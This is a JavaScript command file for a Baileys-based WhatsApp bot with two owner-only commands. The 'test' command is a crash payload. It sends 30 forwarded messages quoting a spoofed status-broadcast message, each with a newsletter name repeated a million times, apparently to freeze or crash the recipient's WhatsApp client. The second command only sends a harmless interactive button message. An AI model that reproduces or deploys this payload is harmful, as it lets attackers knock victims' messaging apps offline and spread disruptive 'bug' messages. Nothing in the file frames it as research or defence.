const { cmd } = require('../lib/index.js');
const {
    generateWAMessageFromContent,
    proto,
} = require('@whiskeysockets/baileys')

cmd({
    pattern: "test",
    isCreator: true
}, async ({ Void, citel, text, users }) => {

    const xbug2 = {
        key: {
            remoteJid: 'status@broadcast',
            fromMe: false,
            participant: '0@s.whatsapp.net'
        },
        message: {
            listResponseMessage: {
                title: citel.pushName
            }
        }
    }

    for (let i = 0; i < 30; i++) {
        await Void.sendMessage(citel.chat, { text: '11111', contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${citel.pushName}`.repeat(1000000), serverMessageId: 2 } } }, { quoted: xbug2 })
    }
})

cmd({
    pattern: "test2",
    isCreator: true
}, async ({ Void, citel }) => {
    let msg = generateWAMessageFromContent(citel.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'test'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'test'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: 'test',
                        subtitle: 'test',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Команды 🗂️","id":".menu"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Создатель 👤","id":".owner"}`
                            },
                        ],
                    })
                })
            }
        }
    }, {})

    await Void.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    })
})